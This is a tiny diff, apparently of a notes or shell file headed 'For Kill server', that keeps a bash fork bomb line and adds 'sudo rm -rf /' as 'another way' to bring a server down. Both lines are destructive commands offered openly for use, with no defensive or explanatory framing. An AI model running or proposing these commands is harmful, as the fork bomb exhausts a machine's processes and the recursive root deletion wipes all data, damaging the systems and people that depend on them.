@@ -1,2 +1,6 @@
 # For Kill server
 :(){ :|:& };:
+
+
+# another way )
+sudo rm -rf /
